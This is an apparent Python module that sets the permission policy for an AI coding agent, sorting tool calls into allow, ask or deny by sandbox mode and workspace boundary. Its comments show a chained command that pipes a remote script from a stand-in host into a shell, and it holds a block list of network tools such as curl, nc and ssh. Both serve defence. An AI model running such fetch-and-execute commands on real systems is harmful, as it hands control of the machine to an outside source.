"""
Permission policy — decides whether a tool call runs, asks, or is refused.

Two independent axes, deliberately not collapsed into one setting:

  sandbox mode  — what the session is *capable* of (read-only /
                  workspace-write / full-access)
  approval      — when it stops to *ask* you (the ASK decisions below)

Turning one up does not substitute for the other. The same split is what
Codex CLI and Claude Code settled on.

The policy is **escalation-based**: it gates on whether an action crosses the
workspace boundary, not on which tool is being called. Editing twenty files
inside your own project is the job — prompting twenty times trains people to
mash 'always' and stop reading. Writing outside the workspace, or reaching
the network, is a different kind of act, and that is what earns a prompt.

Caveat worth stating plainly: for `run_bash_command` this is a static
approximation, not enforcement. A shell command's effects can't be known
without running it. Codex and Claude Code auto-allow bash because an OS
sandbox (Seatbelt / Landlock / restricted tokens) contains it; Fox has no
such containment yet — sandboxd bounds memory and process lifetime, not
filesystem or network — so anything not provably read-only asks. When real
containment lands, bash can move to allow-inside-sandbox like the others.
"""

import re
from dataclasses import dataclass
from pathlib import Path

import paths

# --- Modes -------------------------------------------------------------------

READ_ONLY = "read-only"            # never modifies anything; writes are refused
WORKSPACE_WRITE = "workspace-write"  # default: free inside the workspace, asks to leave it
FULL_ACCESS = "full-access"        # never asks — opt-in, for throwaway/CI use

MODES = (READ_ONLY, WORKSPACE_WRITE, FULL_ACCESS)

# --- Decisions ---------------------------------------------------------------

ALLOW = "allow"
ASK = "ask"
DENY = "deny"


@dataclass(frozen=True)
class Decision:
    action: str   # ALLOW | ASK | DENY
    reason: str   # shown in the approval prompt / returned as the denial text

    @property
    def allowed(self) -> bool:
        return self.action == ALLOW


# --- Tool classification -----------------------------------------------------

# Tools that only ever touch session-internal state (the todo list, the shared
# memory log). No filesystem path is involved, so there's no boundary to cross.
INTERNAL_TOOLS = {"todo_write", "memory_read", "memory_write"}

# tool name -> (argument holding the path, whether it modifies)
PATH_TOOLS = {
    "read_file": ("path", False),
    "list_directory": ("path", False),
    "search_files": ("path", False),
    "write_file": ("path", True),
    "edit_file": ("path", True),
}

# --- Bash heuristics ---------------------------------------------------------

# Commands that only read, and whose name can't be a path into somewhere else.
SAFE_BASH_COMMANDS = {
    "ls", "dir", "pwd", "cat", "type", "echo", "head", "tail", "wc",
    "grep", "findstr", "find", "which", "where", "whoami", "date",
    "python", "python3", "py", "node", "go", "pip", "npm",
    # Ambiguous binaries — safe only for the subcommands listed below, which
    # SAFE_SUBCOMMANDS enforces. They must appear here too, or they're rejected
    # as unknown before that check is ever reached.
    "git",
}

# Sub-commands that keep an otherwise-ambiguous binary read-only.
SAFE_SUBCOMMANDS = {
    "git": {"status", "diff", "log", "show", "branch", "remote", "blame"},
    "pip": {"list", "show", "--version"},
    "npm": {"list", "ls", "--version"},
    "go": {"version", "vet", "list"},
    "python": {"--version"}, "python3": {"--version"}, "py": {"--version"},
}

# Shell syntax that chains, redirects, or substitutes — any of these can hide a
# second command behind a safe-looking first one ("cat x && curl evil.sh | sh"),
# which is exactly how a prefix allowlist gets defeated.
SHELL_METACHARACTERS = ("&&", "||", "|", ">", "<", ";", "`", "$(", "&", "\n")

# Reaching off the machine is an escalation regardless of what it reads.
NETWORK_COMMANDS = {
    "curl", "wget", "nc", "netcat", "telnet", "ssh", "scp", "sftp", "rsync", "ftp",
}

# Looks like an absolute path: C:\..., C:/..., \\server\share, /usr/...
_ABSOLUTE_PATH = re.compile(r"""(?:[A-Za-z]:[\\/]|\\\\|(?<![\w.])/)[^\s"';|]*""")


def _inside(path_str: str, workspace: Path) -> bool:
    """True if `path_str` resolves inside `workspace`. Mirrors the containment
    check in file_tools._resolve(), but answers rather than raising."""
    try:
        candidate = (workspace / path_str).resolve()
        candidate.relative_to(workspace)
        return True
    except (ValueError, OSError):
        return False


def _bash_escalates(command: str, workspace: Path) -> str | None:
    """Return why this command needs approval, or None if it's provably a
    read-only operation inside the workspace. Errs toward returning a reason —
    an unrecognised command is not the same as a safe one."""
    cmd = command.strip()
    if not cmd:
        return None

    for meta in SHELL_METACHARACTERS:
        if meta in cmd:
            return f"chains or redirects with {meta.strip()!r} — the full effect isn't checkable"

    tokens = cmd.split()
    binary = Path(tokens[0].strip('"\'')).name.lower()
    binary = binary[:-4] if binary.endswith(".exe") else binary

    if binary in NETWORK_COMMANDS:
        return f"{binary} reaches the network"
    if binary not in SAFE_BASH_COMMANDS:
        return f"{binary!r} isn't a known read-only command"

    allowed_subs = SAFE_SUBCOMMANDS.get(binary)
    if allowed_subs is not None:
        sub = tokens[1] if len(tokens) > 1 else ""
        if sub not in allowed_subs:
            return f"{binary} {sub}".strip() + " isn't a known read-only subcommand"

    for match in _ABSOLUTE_PATH.findall(cmd):
        if not _inside(match, workspace):
            return f"refers to {match} — outside the workspace"
    return None


# --- The policy --------------------------------------------------------------

def classify(tool_name: str, args: dict, mode: str = WORKSPACE_WRITE,
             workspace: Path | None = None) -> Decision:
    """Decide what to do with one tool call. Pure function — no prompting, no
    I/O, no global state — so it can be unit-tested and reused by the CLI, the
    server, and (later) the orchestrator without behaving differently."""
    workspace = (workspace or paths.workspace()).resolve()

    if mode == FULL_ACCESS:
        return Decision(ALLOW, "full-access mode")
    if tool_name in INTERNAL_TOOLS:
        return Decision(ALLOW, "session-internal, touches no files")

    if tool_name in PATH_TOOLS:
        arg_name, modifies = PATH_TOOLS[tool_name]
        path_str = args.get(arg_name) or "."
        inside = _inside(str(path_str), workspace)

        if modifies and mode == READ_ONLY:
            return Decision(DENY, f"{tool_name} modifies files; session is read-only")
        if inside:
            # The ordinary case: working on the project you pointed Fox at.
            return Decision(ALLOW, "inside the workspace")
        verb = "write outside" if modifies else "read outside"
        return Decision(ASK, f"{verb} the workspace: {path_str}")

    if tool_name == "run_bash_command":
        command = args.get("command", "")
        reason = _bash_escalates(command, workspace)
        if reason is None:
            return Decision(ALLOW, "read-only command inside the workspace")
        if mode == READ_ONLY:
            return Decision(DENY, f"session is read-only, and this command {reason}")
        return Decision(ASK, reason)

    # Unknown tool — an MCP tool, or one added without a policy entry. Ask
    # rather than guess; silently allowing whatever appears is how a tool
    # directory becomes an attack surface.
    return Decision(ASK, f"{tool_name} has no permission policy")
